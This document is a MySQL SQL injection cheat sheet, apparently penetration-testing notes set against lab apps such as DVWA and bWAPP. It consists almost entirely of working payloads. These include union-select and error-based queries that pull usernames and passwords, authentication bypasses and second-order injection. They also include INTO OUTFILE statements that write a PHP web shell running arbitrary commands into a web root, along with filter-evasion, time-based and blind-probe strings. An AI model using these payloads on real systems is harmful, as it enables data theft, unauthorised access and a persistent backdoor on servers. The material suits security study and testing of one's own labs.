## Classic SQL Injection
| **Command** | **Description** |
| --------------|-------------------|
| `database()` | Prints the current database |
| `user()`  | Print the current user |
| `@@version` | Print the version of the database |
| `@@datadir` | Print the path where the mysql server is located |



### Union Select Data Extraction

```sql
mysql> select * from users where user_id = 1 order by 7;              
ERROR 1054 (42S22): Unknown column '7' in 'order clause'
mysql> select * from users where user_id = 1 order by 6;
mysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;
http://demo.ine.local/sqli_2.php?movie=99 UNION SELECT NULL, @@datadir, @@version, @@version, NULL, NULL, NULL&action=go
```


```sql
select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
' AND (SELECT 1 from(Select count(*), concat("Hello ", version()," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #

' AND (SELECT 1 from(Select count(*), concat("Hello ", (select distinct(column_name) from information_schema.columns where table_schema="bWAPP" and table_name='users' limit 3,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #

' AND (SELECT 1 from (Select count(*), concat("Hello ", (select password from bWAPP.users limit 0,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #

' AND (SELECT 1 from (Select count(*), concat("Hello ", (select login from bWAPP.users limit 1,1)," - ", FLOOR(RAND(0)*2)) B from information_schema.tables group by B) C) #


```

### Authentication Bypass

```sql
mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99'
mysql> select * from users where user='admin' and password='blah' OR 1=1 limit 5,1 # 5f4dcc3b5aa765d61d8327deb882cf99'
```

![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/assets/Screenshot%20from%202018-11-17%2016-16-06.png)

### Second Order Injection

```sql
mysql> insert into accounts (username, password, mysignature) values ('admin','mynewpass',(select user())) # 'mynewsignature');
```

![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2016-57-24.png)

### Dropping a Backdoor

```sql
mysql> select * from users where user_id = 1 union select all 1,2,3,4,"<?php system($_REQUEST['c']);?>",6 into outfile "/var/www/dvwa/shell.php" #;

a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/bWAPP/images/yabadooo.php" -- -
```

![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2019-15-16.png)

### Conditional Select

```sql
mysql> select * from users where user = (select concat((select if(1>0,'adm','b')),"in"));
```

![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2021-39-53.png)

### Bypassing Whitespace Filtering

```sql
mysql> select * from users where user_id = 1/**/union/**/select/**/all/**/1,2,3,4,5,6;
```

![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2022-43-46.png)

## Time Based SQL Injection

### Sleep Invokation

```sql
mysql> select * from users where user_id = 1 or (select sleep(1)+1);
```

![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2015-51-50.png)

```sql
select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
```

## Substring
```sql
' OR SUBSTRING(database(),1,1) = 'a
' OR SUBSTRING(database(),1,1) = 'b
' OR SUBSTRING(database(),1,1) = 'c
```

## Testing probes
```
' OR 'a'='a (TRUE condition for string values)

' OR 'a'='b (FALSE condition for string values)

999999999999 OR 1=1 (TRUE condition for numeric values)

999999999999 OR 1=2 (FALSE condition for numeric values)

' (string terminator)

;

, (list elements separator)

-- (comment)
```